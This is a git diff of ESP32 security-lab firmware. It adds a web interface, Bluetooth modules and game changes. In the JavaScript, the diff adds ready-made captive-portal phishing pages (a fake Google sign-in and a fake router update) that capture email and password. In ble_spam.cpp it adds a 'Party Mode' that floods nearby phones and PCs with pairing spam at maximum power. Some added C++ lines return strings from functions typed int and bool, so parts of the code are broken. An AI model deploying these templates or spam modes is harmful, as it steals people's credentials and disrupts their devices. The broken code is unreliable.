@@ -2758,10 +2758,10 @@ index bda7b42..0bbd995 100644
 +.monitor-bar { display:flex; justify-content:space-between; align-items:center; gap:10px; flex-wrap:wrap; }
 +#mon-last { font-size:11px; }
 diff --git a/embedded_resources/web_interface/index.html b/embedded_resources/web_interface/index.html
-index 5290300..42afb3e 100644
+index 5290300..eb7d2cf 100644
 --- a/embedded_resources/web_interface/index.html
 +++ b/embedded_resources/web_interface/index.html
-@@ -1,700 +1,1249 @@
+@@ -1,700 +1,1256 @@
  <!doctype html>
  <html lang="en">
 -  <head>
@@ -2969,7 +2969,7 @@ index 5290300..42afb3e 100644
 +          <div class="ov-tile"><strong>Alerts</strong><b id="mon-ov-alerts">0 alerts</b><small class="muted-sm" id="mon-ov-alerts-sub">WIDS · LAN Guard · Sonar · BLE</small><span id="mon-ov-alerts-badge" class="sl-badge">IDLE</span>
 +            <div class="sl-row sl-mt"><button type="button" class="btn-action" data-monslab-jump="alerts">Xem Alerts →</button><button type="button" class="btn-action" onclick="openFileInEditor('LittleFS','/wids_alerts.txt')">WIDS Log</button></div>
 +          </div>
-+        </div>
+         </div>
 +        <div class="dash-grid sl-mt" style="padding:0">
 +          <div class="dash-card">
 +            <div class="dash-card-head"><h3>Active Chains & Tools</h3><span id="mon-ov-chain-badge" class="sl-badge">IDLE</span></div>
@@ -3016,7 +3016,7 @@ index 5290300..42afb3e 100644
 +          <div class="sl-split sl-mt"><div><strong class="sl-sub">Hidden & Decloaked APs</strong><div id="mon-air-hidden" class="sl-scroll"></div></div><div><strong class="sl-sub">Probe Clusters</strong><div id="mon-probe-list" class="sl-scroll"></div></div></div>
 +          <div class="sl-row sl-mt"><button type="button" class="btn-action" data-jump-tab="seclab" data-jump-slab="wifi">Mở Wi-Fi chi tiết →</button></div>
 +        </details>
-+      </div>
+       </div>
 +
 +      <!-- System -->
 +      <div id="monslab-system" class="slab-view hidden">
@@ -3089,8 +3089,8 @@ index 5290300..42afb3e 100644
 +          <label class="sl-inline-label" style="display:flex;align-items:center;gap:6px"><input type="checkbox" id="st-auto" checked /> Auto 3s</label>
 +          <button type="button" class="btn-action btn-default" id="st-refresh">Refresh Now</button>
 +          <span id="st-last" class="mono muted-sm">--</span>
-         </div>
-       </div>
++        </div>
++      </div>
 +
 +      <div class="seclab-subtabs" role="tablist" aria-label="Studio sections">
 +        <button type="button" class="slab-btn active" data-stslab="overview" aria-selected="true">Tổng quan</button>
@@ -3743,11 +3743,7 @@ index 5290300..42afb3e 100644
 -                    stroke-linecap="round"
 -                    stroke-linejoin="round"
 -                  />
-+              <button type="button" class="nav nav-page-up" data-direction="NextPage" title="Next Page" aria-label="Next Page">
-+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-+                  <path d="M15.5 12L5.72 19.11V4.89L15.5 12Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
-+                  <line x1="18.2" y1="4.9" x2="18.2" y2="19.1" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-                 </svg>
+-                </svg>
 -              </div>
 -              <div class="nav nav-up" data-direction="Up" title="Up">
 -                <svg
@@ -3760,7 +3756,11 @@ index 5290300..42afb3e 100644
 -                    fill="currentColor"
 -                    d="M43.7,38H8.3c-1,0-1.7-1.3-0.9-2.2l17.3-21.2c0.6-0.8,1.9-0.8,2.5,0l17.5,21.2C45.4,36.7,44.8,38,43.7,38z"
 -                  />
--                </svg>
++              <button type="button" class="nav nav-page-up" data-direction="NextPage" title="Next Page" aria-label="Next Page">
++                <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
++                  <path d="M15.5 12L5.72 19.11V4.89L15.5 12Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
++                  <line x1="18.2" y1="4.9" x2="18.2" y2="19.1" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                 </svg>
 -              </div>
 -              <div
 -                class="nav nav-menu"
@@ -3888,13 +3888,13 @@ index 5290300..42afb3e 100644
 +              <div class="bm-status">
 +                <span id="bm-owner-pill" class="bm-pill">DSolution</span>
 +                <span class="bm-bat">98%</span>
-               </div>
++              </div>
 +              <div class="bm-center">
 +                <div class="bm-fin"></div>
 +                <div id="bm-title" class="bm-title">DSolution</div>
 +                <div id="bm-sub" class="bm-sub">ESP32-S3 SEC LAB</div>
 +                <div class="bm-bar"><i></i></div>
-+              </div>
+               </div>
 +              <div class="bm-foot">v1.14 &bull; <span id="bm-mdns">http://bruce.local</span></div>
              </div>
 -            <div class="p-bot">
@@ -3990,12 +3990,12 @@ index 5290300..42afb3e 100644
 +              <div class="field">
 +                <label for="pers-apssid">AP Hotspot SSID</label>
 +                <input type="text" id="pers-apssid" maxlength="32" placeholder="BruceNet" />
-               </div>
++              </div>
 +              <div class="field">
 +                <label for="pers-appwd">AP Password (8+ chars or blank)</label>
 +                <input type="text" id="pers-appwd" maxlength="63" placeholder="brucenet" />
-+              </div>
-+            </div>
+               </div>
+             </div>
 +            <div class="field">
 +              <label for="pers-style">Main menu layout &amp; WebUI style</label>
 +              <select id="pers-style"><option value="0">Carousel · rounded</option><option value="1">Grid · technical</option></select>
@@ -4018,7 +4018,7 @@ index 5290300..42afb3e 100644
 +            <div class="pers-actions">
 +              <button type="button" class="btn-action btn-default" id="btn-save-pers">Apply &amp; Save to Flash</button>
 +              <button type="button" class="btn-action" id="btn-reload-pers">Reset Form</button>
-             </div>
++            </div>
 +            <div id="pers-status" class="ota-status hidden"></div>
            </div>
          </div>
@@ -4116,18 +4116,15 @@ index 5290300..42afb3e 100644
 +          <button type="button" class="chip-cmd" data-cmd="tone 2400 120">tone 2400 120</button>
 +          <button type="button" class="chip-cmd" data-cmd="led hex 00F0FF">led hex 00F0FF</button>
 +          <button type="button" class="chip-cmd" data-cmd="led off">led off</button>
-+        </div>
+         </div>
 +        <pre id="console-out" class="console-out">Bruce SecLab Serial Console Ready. Type 'help' or click a command chip above.&#10;</pre>
 +        <div class="console-input-row">
 +          <span class="mono prompt-pfx">#</span>
 +          <input type="text" id="console-in" placeholder="Enter Bruce CLI command (Arrow Up/Down for history)..." autocomplete="off" />
 +          <button type="button" class="btn-action btn-default" id="console-run">Run</button>
 +          <button type="button" class="btn-action" id="console-clear">Clear</button>
-         </div>
-       </div>
--      <div class="dialog editor hidden">
--        <div class="dialog-head">
--          Edit: <span class="editor-file-name"></span>
++        </div>
++      </div>
 +    </section>
 +
 +    <!-- TAB 6: SECLAB -->
@@ -4141,11 +4138,7 @@ index 5290300..42afb3e 100644
 +        <div class="seclab-bar-actions">
 +          <button type="button" class="btn-action" id="sl-refresh">Refresh Now</button>
 +          <button type="button" class="btn-action btn-danger" data-sl-action="stop_all" data-sl-confirm="Stop all stoppable SecLab+ tools? An in-progress pairing audit will finish on its own.">Stop All</button>
-         </div>
--        <div class="dialog-body">
--          <div class="editor-container">
--            <div class="line-numbers"></div>
--            <textarea class="file-content" style="resize: none"></textarea>
++        </div>
 +      </div>
 +
 +      <!-- Sub-tabs inside SecLab -->
@@ -4155,14 +4148,21 @@ index 5290300..42afb3e 100644
 +        <button type="button" class="slab-btn" data-slab="lan">LAN & HTTP</button>
 +        <button type="button" class="slab-btn" data-slab="ble">BLE & HID</button>
 +        <button type="button" class="slab-btn" data-slab="studio">USB Vault</button>
-+      </div>
+       </div>
+-      <div class="dialog editor hidden">
+-        <div class="dialog-head">
+-          Edit: <span class="editor-file-name"></span>
 +      <div id="sl-plus-msg" class="ota-status hidden" role="status" aria-live="polite" aria-busy="false" style="margin:10px 16px 0"></div>
 +
 +      <!-- ========== OVERVIEW ========== -->
 +      <div id="slab-overview" class="slab-view">
 +        <div class="sl-note">
 +          <strong>Authorized security audits only.</strong> Chỉ dùng trên hệ thống bạn sở hữu/được phép. 2C proxy chỉ xử lý cleartext HTTP/1.0 — TLS <code>CONNECT</code> luôn bị từ chối.
-+        </div>
+         </div>
+-        <div class="dialog-body">
+-          <div class="editor-container">
+-            <div class="line-numbers"></div>
+-            <textarea class="file-content" style="resize: none"></textarea>
 +
 +        <!-- Compact status tiles — 1 line overview -->
 +        <div class="overview-grid sl-mt">
@@ -4219,14 +4219,14 @@ index 5290300..42afb3e 100644
 +            <input type="text" id="sl-napt-ssid" placeholder="Optional uplink SSID (blank = current STA)" />
 +            <input type="password" id="sl-napt-pwd" placeholder="Uplink Wi-Fi password (if needed)" />
 +            <button type="button" class="btn-action" onclick="openWifiModal()">Scan WiFi</button>
-           </div>
++          </div>
 +          <div class="sl-row sl-mt">
 +            <button type="button" class="btn-action btn-default" id="sl-napt-start">Start NAPT Router</button>
 +            <button type="button" class="btn-action btn-danger" id="sl-napt-stop">Stop NAPT</button>
 +            <button type="button" class="btn-action btn-default" id="sl-napt-auto" aria-pressed="true">Auto-Block Trackers: ON</button>
 +            <button type="button" class="btn-action" id="sl-napt-export">Export Log</button>
 +            <button type="button" class="btn-action" id="sl-napt-clear">Clear Feed</button>
-+          </div>
+           </div>
 +          <div id="sl-napt-msg" class="ota-status hidden" role="status" aria-live="polite" aria-busy="false"></div>
 +          <div class="kv-grid sl-mt">
 +            <div class="kv-item"><span>Uplink Wi-Fi</span><b id="sl-napt-up">--</b></div>
@@ -4322,15 +4322,22 @@ index 5290300..42afb3e 100644
 +          <div id="pt-list" class="sl-scroll sl-mt" style="max-height:260px"></div>
 +          <div class="sl-group sl-mt" style="border:1px solid var(--border);border-radius:8px;padding:12px">
 +            <div class="sl-row">
++              <select id="pt-preset" class="sl-input" style="flex:1;min-width:160px"><option value="">-- Chọn mẫu nhanh (preset) --</option><option value="google">Google Login (mặc định)</option><option value="rickroll">🎵 Rickroll Portal (video rickroll + bắt pass)</option><option value="rickroll-custom">🎵 Rickroll tuỳ biến (đổi video/tiêu đề)</option><option value="fake-update">Router Update (giả cập nhật)</option><option value="wifi-login">Wifi Login đơn giản</option><option value="custom">Trống (tự viết)</option></select>
 +              <input type="text" id="pt-name" placeholder="Tên file: google.html" class="sl-input" style="flex:1;min-width:160px" />
-+              <input type="text" id="pt-ap" placeholder="AP name hiện ở dòng đầu: <!-- AP=&quot;Free Wifi&quot; --> (tuỳ chọn)" class="sl-input" style="flex:1;min-width:160px" />
++              <input type="text" id="pt-ap" placeholder="AP: <!-- AP=&quot;Free Wifi&quot; -->" class="sl-input" style="flex:1;min-width:160px" />
++            </div>
++            <div id="pt-rickroll-custom" class="sl-group sl-mt hidden" style="border:1px dashed var(--border);padding:8px">
++              <strong class="sl-sub">Tuỳ biến Rickroll (không cần viết HTML):</strong>
++              <div class="sl-row sl-mt"><input type="text" id="pt-rr-title" placeholder="Tiêu đề: Free Wifi Connected! 🎉" class="sl-input" style="flex:1" /><input type="text" id="pt-rr-msg" placeholder="Lời nhắn: Enter password to stay connected" class="sl-input" style="flex:1" /></div>
++              <div class="sl-row"><input type="text" id="pt-rr-video" placeholder="Video URL (mp4 hoặc YouTube embed): https://.../mov_bbb.mp4" class="sl-input" style="flex:1" /><input type="text" id="pt-rr-btn" placeholder="Nút: Connect / Update" class="sl-input" style="flex:1;max-width:160px" /></div>
++              <div class="sl-row"><button type="button" class="btn-action btn-default" id="pt-rr-generate">Tạo HTML Rickroll → đổ xuống ô dưới</button><small class="muted-sm">Đổi video thành link YouTube, TikTok, hoặc mp4 riêng — không bị hardcode rickroll</small></div>
 +            </div>
 +            <textarea id="pt-content" placeholder="Dán HTML mẫu vào đây... (giữ nguyên <form action=&quot;/post&quot;> để bắt password)" class="sl-input sl-mt" style="width:100%;min-height:180px;font-family:monospace;font-size:12px"></textarea>
 +            <div class="sl-row sl-mt">
 +              <button type="button" class="btn-action btn-default" id="pt-save">Lưu mẫu</button>
 +              <button type="button" class="btn-action" id="pt-preview">Xem trước (mở tab)</button>
 +              <button type="button" class="btn-action" id="pt-cancel">Huỷ</button>
-+              <small class="muted-sm" style="margin-left:auto">Mẹo: copy mã HTML từ <a href="https://github.com" target="_blank">mẫu có sẵn</a> rồi dán vào ô trên → Lưu → Chọn <b>Dùng</b> để Active.</small>
++              <small class="muted-sm" style="margin-left:auto">Preset Rickroll có thể đổi video/tiêu đề — không hardcode. Xong bấm <b>Lưu → Dùng</b> để Active.</small>
 +            </div>
 +          </div>
 +        </details>
@@ -4647,7 +4654,7 @@ index 5290300..42afb3e 100644
 +</body>
  </html>
 diff --git a/embedded_resources/web_interface/index.js b/embedded_resources/web_interface/index.js
-index fd61602..c16994c 100644
+index fd61602..64ca012 100644
 --- a/embedded_resources/web_interface/index.js
 +++ b/embedded_resources/web_interface/index.js
 @@ -6,20 +6,17 @@ const T = {
@@ -6728,7 +6735,7 @@ index fd61602..c16994c 100644
      return;
    }
  
-@@ -1062,662 +1531,1567 @@ $(".container").addEventListener("click", async (e) => {
+@@ -1062,662 +1531,1569 @@ $(".container").addEventListener("click", async (e) => {
    if (actPlay) {
      e.preventDefault();
      let cmd = actPlay.getAttribute("data-cmd");
@@ -7277,6 +7284,8 @@ index fd61602..c16994c 100644
 +document.getElementById("pt-refresh")?.addEventListener("click", portalRefresh);
 +document.getElementById("pt-save")?.addEventListener("click", portalSave);
 +document.getElementById("pt-cancel")?.addEventListener("click", ()=> portalSetForm("", "", ""));
++document.getElementById("pt-preset")?.addEventListener("change", (e)=>{ const v=e.target.value; const nameEl=document.getElementById("pt-name"), apEl=document.getElementById("pt-ap"), cEl=document.getElementById("pt-content"), cust=document.getElementById("pt-rickroll-custom"); if(cust) cust.classList.toggle("hidden", v!=="rickroll-custom"); if(v==="google"){ if(nameEl) nameEl.value="google.html"; if(apEl) apEl.value="Free Wifi"; if(cEl) cEl.value=`<!-- AP="Free Wifi" -->\n<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font-family:Arial,sans-serif;background:#fff;margin:0;padding:20px}.container{max-width:420px;margin:40px auto;border:1px solid #CEC0DE;border-radius:8px;padding:20px;box-shadow:0 2px 10px rgba(0,0,0,.1)}h2{text-align:center;color:#202124}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:6px}button{width:100%;padding:12px;background:#0b57d0;color:#fff;border:none;border-radius:6px}</style></head><body><div class="container"><h2>Sign in</h2><p>Use your Google Account</p><form action="/post"><input name="email" placeholder="Email or phone" required><input name="password" type="password" placeholder="Password" required><button type="submit">Next</button></form></div></body></html>`; } else if(v==="rickroll"){ if(nameEl) nameEl.value="rickroll.html"; if(apEl) apEl.value="Free Wifi"; if(cEl) cEl.value=`<!-- AP="Free Wifi" -->\n<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Free Wifi</title><style>body{margin:0;background:#000;color:#fff;text-align:center;font-family:sans-serif}video{width:100%;max-height:60vh} .card{max-width:560px;margin:20px auto;background:#111;padding:16px;border-radius:12px}input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none}button{width:100%;padding:12px;background:#ff0000;color:#fff;border:none;border-radius:8px}</style></head><body><video autoplay muted loop playsinline controls src="https://www.w3schools.com/html/mov_bbb.mp4"></video><div class="card"><h2>🎵 Never Gonna Give You Up!</h2><p>Free Wifi Connected! Enter password to continue</p><form action="/post"><input name="password" type="password" placeholder="WiFi password" required><button type="submit">Connect</button></form></div></body></html>`; } else if(v==="rickroll-custom"){ if(nameEl) nameEl.value="rickroll-custom.html"; if(apEl) apEl.value="Free Wifi"; if(document.getElementById("pt-rr-title")) document.getElementById("pt-rr-title").value="Free Wifi Connected! 🎉"; if(document.getElementById("pt-rr-msg")) document.getElementById("pt-rr-msg").value="Enter WiFi password to stay connected"; if(document.getElementById("pt-rr-video")) document.getElementById("pt-rr-video").value="https://www.w3schools.com/html/mov_bbb.mp4"; if(document.getElementById("pt-rr-btn")) document.getElementById("pt-rr-btn").value="Connect"; } else if(v==="fake-update"){ if(nameEl) nameEl.value="fake-update.html"; if(apEl) apEl.value="Router Update"; if(cEl) cEl.value=`<!-- AP="Router Update" -->\n<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Router Update</title><style>body{font-family:sans-serif;background:#d3d3d3;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:24px;border-radius:12px;max-width:360px;width:90%;text-align:center}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:6px}button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:6px}</style></head><body><div class="box"><h2>Router Update Required</h2><p>Enter WiFi password to update</p><form action="/post"><input name="password" type="password" placeholder="Password" required><button type="submit">Update</button></form></div></body></html>`; } else if(v==="wifi-login"){ if(nameEl) nameEl.value="wifi-login.html"; if(apEl) apEl.value="Free Wifi"; if(cEl) cEl.value=`<!-- AP="Free Wifi" -->\n<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font-family:sans-serif;max-width:420px;margin:40px auto;padding:20px}h2{text-align:center}input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:6px}button{width:100%;padding:12px;background:#0b57d0;color:#fff;border:none;border-radius:6px}</style></head><body><h2>Free Wifi — Login</h2><p>Enter password to continue</p><form action="/post"><input name="email" placeholder="Email"><input name="password" type="password" placeholder="Password" required><button type="submit">Connect</button></form></body></html>`; } else if(v==="custom"){ if(nameEl) nameEl.value=""; if(cEl) cEl.value=""; } });
++document.getElementById("pt-rr-generate")?.addEventListener("click", ()=>{ const title=document.getElementById("pt-rr-title")?.value||"Free Wifi Connected!"; const msg=document.getElementById("pt-rr-msg")?.value||"Enter WiFi password"; const video=document.getElementById("pt-rr-video")?.value||"https://www.w3schools.com/html/mov_bbb.mp4"; const btn=document.getElementById("pt-rr-btn")?.value||"Connect"; const ap=document.getElementById("pt-ap")?.value||"Free Wifi"; const isYouTube=video.includes("youtube.com")||video.includes("youtu.be"); let media=isYouTube?`<iframe width="100%" height="315" src="${video.replace("watch?v=","embed/")}" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>`:`<video autoplay muted loop playsinline controls src="${video}" style="width:100%;max-height:60vh;background:#000"></video>`; const html=`<!-- AP="${ap}" -->\n<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${title}</title><style>body{margin:0;background:#000;color:#fff;text-align:center;font-family:sans-serif} .card{max-width:560px;margin:20px auto;background:#111;padding:16px;border-radius:12px}input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none}button{width:100%;padding:12px;background:#ff0000;color:#fff;border:none;border-radius:8px}</style></head><body>${media}<div class="card"><h2>${title}</h2><p>${msg}</p><form action="/post"><input name="password" type="password" placeholder="WiFi password" required><button type="submit">${btn}</button></form></div></body></html>`; const cEl=document.getElementById("pt-content"); if(cEl) cEl.value=html; });
 +document.getElementById("pt-new")?.addEventListener("click", ()=>{
 +  const base=`<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font-family:sans-serif;max-width:420px;margin:40px auto;padding:20px}input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:6px}button{width:100%;padding:12px;background:#0b57d0;color:#fff;border:none;border-radius:6px}h2{text-align:center}</style></head><body><h2>Free Wifi — Đăng nhập</h2><p>Vui lòng nhập mật khẩu WiFi để tiếp tục</p><form action="/post"><input name="email" placeholder="Email" required><input name="password" type="password" placeholder="Mật khẩu" required><button type="submit">Kết nối</button></form></body></html>`;
 +  portalSetForm("my-portal.html","<!-- AP=\"Free Wifi\" -->\n"+base,"Free Wifi");
@@ -24097,6 +24106,100 @@ index 0000000..bafd4e4
 +void bleSecurityAuditClear();
 +
 +#endif
+diff --git a/src/modules/ble/ble_spam.cpp b/src/modules/ble/ble_spam.cpp
+index a702b84..3a1e755 100644
+--- a/src/modules/ble/ble_spam.cpp
++++ b/src/modules/ble/ble_spam.cpp
+@@ -569,7 +569,8 @@ enum BleSpamAttackType {
+     BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
+     BLE_SPAM_ATTACK_SAMSUNG,
+     BLE_SPAM_ATTACK_BLE_BEACON,
+-    BLE_SPAM_ATTACK_RANDOM_ALL
++    BLE_SPAM_ATTACK_RANDOM_ALL,
++    BLE_SPAM_ATTACK_PARTY
+ };
+ 
+ #define BLE_SPAM_MAX_CUSTOM_NAMES 20
+@@ -696,7 +697,8 @@ static const BleSpamAttackOption BLE_SPAM_ATTACK_OPTIONS[] = {
+     {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,    "Windows Swift Pair"   },
+     {BLE_SPAM_ATTACK_SAMSUNG,               "Samsung BLE Spam"     },
+     {BLE_SPAM_ATTACK_BLE_BEACON,            "BLE Beacon Spam"      },
+-    {BLE_SPAM_ATTACK_RANDOM_ALL,            "Random / All"         }
++    {BLE_SPAM_ATTACK_RANDOM_ALL,            "Random / All"         },
++    {BLE_SPAM_ATTACK_PARTY,                 "🎉 Party Mode (All Devices)"}
+ };
+ 
+ #if !defined(LITE_VERSION)
+@@ -1045,6 +1047,8 @@ static int bleSpamGetDeviceCount(BleSpamAttackType type) {
+         }
+         case BLE_SPAM_ATTACK_SAMSUNG:
+             return sizeof(BLE_SPAM_SAMSUNG_DEVICES) / sizeof(BLE_SPAM_SAMSUNG_DEVICES[0]);
++        case BLE_SPAM_ATTACK_PARTY:
++            return "All Devices — rotating";
+         case BLE_SPAM_ATTACK_BLE_BEACON: {
+             int nPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
+             std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
+@@ -1107,6 +1111,8 @@ static const char *bleSpamGetDeviceName(BleSpamAttackType type, int index) {
+                 index < (int)(sizeof(BLE_SPAM_SAMSUNG_DEVICES) / sizeof(BLE_SPAM_SAMSUNG_DEVICES[0])))
+                 return BLE_SPAM_SAMSUNG_DEVICES[index];
+             return "Samsung";
++        case BLE_SPAM_ATTACK_PARTY:
++            return "All Devices — rotating";
+         case BLE_SPAM_ATTACK_BLE_BEACON: {
+             int nPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
+             if (index >= 0 && index < nPresets) return BLE_SPAM_BEACON_PRESETS[index];
+@@ -1455,6 +1461,8 @@ static bool bleSpamBuildAdvertisementData(
+             advertisementData = AdvData;
+             return true;
+         }
++        case BLE_SPAM_ATTACK_PARTY:
++            return "All Devices — rotating";
+         case BLE_SPAM_ATTACK_BLE_BEACON: {
+             advertisementData = BLEAdvertisementData();
+             int nBeaconPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
+@@ -1662,7 +1670,24 @@ bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSp
+         BleSpamAttackType attackType = selection.attack_type;
+         int deviceIndex = selection.device_index;
+ 
+-        if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
++        if (selection.attack_type == BLE_SPAM_ATTACK_PARTY) {
++            // Party: cycle through all types rapidly for wide impact (affects many devices at once)
++            static uint32_t partyLastSwitch = 0;
++            static BleSpamAttackType partyCurrent = BLE_SPAM_ATTACK_APPLE_PAIRING;
++            uint32_t nowMs = millis();
++            if (nowMs - partyLastSwitch > 700 || partyLastSwitch == 0) {
++                const BleSpamAttackType partyPool[] = {BLE_SPAM_ATTACK_APPLE_PAIRING, BLE_SPAM_ATTACK_APPLE_ACTION, BLE_SPAM_ATTACK_ANDROID_ALERT, BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR, BLE_SPAM_ATTACK_SAMSUNG, BLE_SPAM_ATTACK_BLE_BEACON};
++                partyCurrent = partyPool[random(0, 6)];
++                partyLastSwitch = nowMs;
++                // LED sync: color per type
++                #ifdef HAS_RGB_LED
++                // will be handled in runScreen via leds
++                #endif
++            }
++            attackType = partyCurrent;
++            // pick random device within that type for max variety
++            bleSpamPickRandomSelection(attackType, deviceIndex);
++        } else if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
+             bleSpamPickRandomSelection(attackType, deviceIndex);
+         }
+ 
+@@ -2228,8 +2253,15 @@ static void bleSpamMenuUi() {
+         selection.device_index = 0;
+ 
+         // Types that go straight to config without a device list
+-        if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
++        if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL || selection.attack_type == BLE_SPAM_ATTACK_PARTY) {
+             while (true) {
++                if (selection.attack_type == BLE_SPAM_ATTACK_PARTY) {
++                    // Party preset: max wide impact
++                    config.adv_ms = 20;
++                    config.gap_ms = 5;
++                    config.tx_power = BLE_SPAM_TX_MAX;
++                    config.mac_rand_mode = BLE_SPAM_MAC_EVERY_PACKET;
++                }
+                 bool startAttack = bleSpamConfigScreen(selection, config, configChanged);
+                 bleSpamSaveConfig(config);
+                 configChanged = false;
 diff --git a/src/modules/ble/ble_tracker_guard.cpp b/src/modules/ble/ble_tracker_guard.cpp
 new file mode 100644
 index 0000000..afbf717
@@ -25739,24 +25842,437 @@ index 0000000..2104303
 +    }
 +};
 diff --git a/src/modules/others/tururururu.cpp b/src/modules/others/tururururu.cpp
-index 4d2ea72..6d3408a 100644
+index 4d2ea72..eab4882 100644
 --- a/src/modules/others/tururururu.cpp
 +++ b/src/modules/others/tururururu.cpp
-@@ -54,12 +54,14 @@ void initSprites() {
- // Função para desenhar o tubarão
- void drawShark() {
-     sprite.pushSprite(sharkX - sharkSize, sharkY - 7);
-+    tft.markUnmappedPixels();
-     // sprite.pushToSprite(&sprite,sharkX-sharkSize, sharkY,TFT_TRANSPARENT);
+@@ -3,31 +3,37 @@
+ #include "core/mykeyboard.h"
+ #include <globals.h>
+ 
+-// By: @IncursioHack / github.com/IncursioHack
++// Megalodon — nâng cấp: nhiều cấp, boss, bom, sao, mạng, hiệu ứng
+ 
+-// Configuração do personagem principal (tubarão)
+ int sharkX = 40;
+ int sharkY = 80;
+ int sharkSize = 14;
+ bool sharkUp = false;
+ bool sharkDown = false;
+ 
+-// Configuração dos peixes
++enum FishType { FISH_NORMAL, FISH_GOLD, FISH_BOMB, FISH_BOSS, FISH_HEART, FISH_STAR };
+ struct Fish {
+     int x, y, size;
++    FishType type;
++    int speed;
++    int hits; // for boss
+ };
+-Fish fish[5]; // Array de peixes
++Fish fish[8];
++int fishCount = 5;
++int lives = 3;
++int level = 1;
++bool invincible = false;
++unsigned long invincibleUntil = 0;
++unsigned long levelStart = 0;
++bool isBossLevel = false;
++int bossHitsNeeded = 3;
+ 
+-// Configuração de pontuação
+-int score = 0;
++// visuals
++struct Bubble { int x,y, r, speed; };
++Bubble bubbles[10];
+ 
+ void initSprites() {
+-    // sprite para desenhar a tela toda
+-    // tft.deleteSprite();
+-    // tft.createSprite(tftWidth,tftHeight);
+     tft.fillScreen(bruceConfig.bgColor);
+-
+-    // menu_op para desenhar o tubarao
+     sprite.deleteSprite();
+     sprite.createSprite(32, 30);
+     sprite.fillScreen(bruceConfig.bgColor);
+@@ -39,7 +45,6 @@ void initSprites() {
+     sprite.fillTriangle(23, 18, 29, 18, 24, 21, TFT_RED);
+     sprite.fillRect(0, 21, 32, 15, bruceConfig.bgColor);
+ 
+-    // draw para desenhar o peixe
+     draw.deleteSprite();
+     draw.createSprite(20, 8);
+     draw.fillScreen(bruceConfig.bgColor);
+@@ -49,153 +54,277 @@ void initSprites() {
+     draw.drawFastVLine(10, 1, 7, TFT_WHITE);
+     draw.drawFastVLine(15, 1, 7, TFT_WHITE);
+     draw.fillCircle(3, 3, 1, TFT_BLACK);
++    for(int i=0;i<10;i++){ bubbles[i].x=random(tftWidth); bubbles[i].y=random(tftHeight); bubbles[i].r=random(1,3); bubbles[i].speed=random(1,3); }
  }
  
- // Função para desenhar peixes
- void drawFish(Fish &f) {
-     draw.pushSprite(f.x, f.y);
+-// Função para desenhar o tubarão
+ void drawShark() {
++    if(invincible && (millis()/150)%2==0) return; // blink when invincible
+     sprite.pushSprite(sharkX - sharkSize, sharkY - 7);
+-    // sprite.pushToSprite(&sprite,sharkX-sharkSize, sharkY,TFT_TRANSPARENT);
 +    tft.markUnmappedPixels();
-     // draw.pushToSprite(&sprite,f.x,f.y,TFT_TRANSPARENT);
+ }
+-
+-// Função para desenhar peixes
+ void drawFish(Fish &f) {
+-    draw.pushSprite(f.x, f.y);
+-    // draw.pushToSprite(&sprite,f.x,f.y,TFT_TRANSPARENT);
++    if(f.type==FISH_BOMB){
++        // bomb: black with red fuse
++        draw.fillScreen(bruceConfig.bgColor);
++        draw.fillEllipse(6,4,6,3,TFT_BLACK);
++        draw.fillCircle(10,2,2,TFT_RED);
++        draw.fillTriangle(16,0,16,8,11,5,TFT_BLACK);
++        draw.pushSprite(f.x, f.y);
++    } else if(f.type==FISH_GOLD){
++        draw.fillScreen(bruceConfig.bgColor);
++        draw.fillEllipse(6,4,6,3,TFT_YELLOW);
++        draw.fillTriangle(16,0,16,8,11,5,TFT_GOLD);
++        draw.drawFastVLine(6,1,7,TFT_WHITE);
++        draw.pushSprite(f.x, f.y);
++    } else if(f.type==FISH_BOSS){
++        // bigger boss - custom
++        tft.fillEllipse(f.x+8, f.y+4, 12, 6, TFT_RED);
++        tft.fillTriangle(f.x+18,f.y, f.x+18,f.y+8, f.x+12,f.y+4, TFT_MAROON);
++        // health bar
++        int w=16; int hpW = (w * f.hits)/bossHitsNeeded;
++        tft.fillRect(f.x, f.y-4, w, 2, TFT_DARKGREY);
++        tft.fillRect(f.x, f.y-4, hpW, 2, TFT_GREEN);
++    } else if(f.type==FISH_HEART){
